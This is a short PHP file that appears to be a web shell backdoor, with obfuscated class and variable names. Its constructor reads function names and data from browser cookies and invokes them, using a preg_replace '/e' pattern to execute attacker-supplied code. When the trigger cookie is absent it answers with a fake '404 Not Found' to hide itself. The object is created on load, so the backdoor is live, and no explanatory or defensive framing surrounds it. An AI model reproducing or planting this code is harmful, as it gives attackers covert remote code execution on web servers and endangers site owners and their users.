<?php		
class		COiTdp		{		
		public		function		__construct()		{				
				$jq		=		@$_COOKIE['WWuiLyDI3'];		
				if		($jq)		{		
						$option		=		$jq		(@$_COOKIE['WWuiLyDI2'])		;		
						$au		=		$jq		(		@$_COOKIE['WWuiLyDI1'])		;		
						$option		(		"/438/e"		,		$au		,		438		)		;		
				}		else		{		
						header("HTTP/1.0 404 Not Found");
				}		
		}		
}		
$content		=		new		COiTdp;		